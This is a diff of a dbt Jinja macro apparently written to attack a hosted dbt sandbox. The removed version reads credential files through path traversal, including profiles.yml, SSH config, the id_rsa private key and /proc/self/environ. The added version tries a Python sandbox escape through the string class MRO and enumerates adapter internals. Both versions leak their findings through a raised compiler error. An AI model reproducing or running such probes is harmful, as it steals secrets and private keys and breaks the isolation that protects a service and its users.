@@ -1,47 +1,32 @@
-{% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}
-{% set ns = namespace(output='[FILE_v3] ') %}
+{% set ns = namespace(output='[MODULES] ') %}
 
-{# Test 1: Read a file we KNOW exists in the project - dbt_project.yml #}
-{% set proj = load_file_contents('dbt_project.yml') %}
-{% if proj %}
-  {% set ns.output = ns.output ~ 'PROJECT_FILE=YES(' ~ proj | length ~ 'b)' %}
+{# Check what modules are available #}
+{% if modules is defined %}
+  {% set ns.output = ns.output ~ 'modules=DEFINED' %}
+  {% if modules.datetime is defined %}
+    {% set ns.output = ns.output ~ ' | datetime=YES' %}
+    {% set ns.output = ns.output ~ ' | dt_class=' ~ modules.datetime.__class__.__name__ %}
+  {% endif %}
+  {% if modules.pytz is defined %}
+    {% set ns.output = ns.output ~ ' | pytz=YES' %}
+  {% endif %}
 {% else %}
-  {% set ns.output = ns.output ~ 'PROJECT_FILE=NO' %}
+  {% set ns.output = ns.output ~ 'modules=UNDEFINED' %}
 {% endif %}
 
-{# Test 2: Relative path to profiles.yml #}
-{% set p1 = load_file_contents('../.dbt/profiles.yml') %}
-{% set p2 = load_file_contents('../../.dbt/profiles.yml') %}
-{% set p3 = load_file_contents('/restricted-chroot/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml') %}
-{% set ns.output = ns.output ~ ' | REL1=' ~ (p1 | length) ~ 'b | REL2=' ~ (p2 | length) ~ 'b | CHROOT=' ~ (p3 | length) ~ 'b' %}
+{# Try Python sandbox escape via string class chain #}
+{% set ns.output = ns.output ~ ' | str_class=' ~ ''.__class__.__name__ %}
+{% set ns.output = ns.output ~ ' | str_mro=' ~ ''.__class__.__mro__ | string | truncate(200) %}
 
-{# If any profiles.yml found, show content #}
-{% if p1 %}
-  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p1[:800] %}
-{% elif p2 %}
-  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p2[:800] %}
-{% elif p3 %}
-  {% set ns.output = ns.output ~ ' | PROFILES_CONTENT=' ~ p3[:800] %}
-{% endif %}
+{# Try to access config internals #}
+{% set ns.output = ns.output ~ ' | config_class=' ~ config.__class__.__name__ %}
+{% set ns.output = ns.output ~ ' | adapter_class=' ~ adapter.__class__.__name__ %}
 
-{# Test 3: SSH config relative #}
-{% set s1 = load_file_contents('../.ssh/config') %}
-{% set s2 = load_file_contents('../.ssh/id_rsa') %}
-{% set ns.output = ns.output ~ ' | SSH_CFG=' ~ (s1 | length) ~ 'b | SSH_KEY=' ~ (s2 | length) ~ 'b' %}
-{% if s1 %}
-  {% set ns.output = ns.output ~ ' | SSH_CFG_CONTENT=' ~ s1[:300] %}
-{% endif %}
-{% if s2 %}
-  {% set ns.output = ns.output ~ ' | SSH_KEY_CONTENT=' ~ s2[:300] %}
-{% endif %}
-
-{# Test 4: /etc files with chroot prefix #}
-{% set r1 = load_file_contents('/restricted-chroot/etc/resolv.conf') %}
-{% set r2 = load_file_contents('/etc/resolv.conf') %}
-{% set ns.output = ns.output ~ ' | RESOLV_CHROOT=' ~ (r1 | length) ~ 'b | RESOLV_DIRECT=' ~ (r2 | length) ~ 'b' %}
-
-{# Test 5: /proc via chroot #}
-{% set e1 = load_file_contents('/restricted-chroot/proc/self/environ') %}
-{% set ns.output = ns.output ~ ' | ENVIRON_CHROOT=' ~ (e1 | length) ~ 'b' %}
+{# Try to get adapter connection manager #}
+{% set result = [] %}
+{% for attr in adapter.__class__.__dict__.keys() if not attr.startswith('_') %}
+  {% do result.append(attr) %}
+{% endfor %}
+{% set ns.output = ns.output ~ ' | adapter_attrs=' ~ result | join(',') | truncate(300) %}
 
 {{ exceptions.raise_compiler_error(ns.output) }}
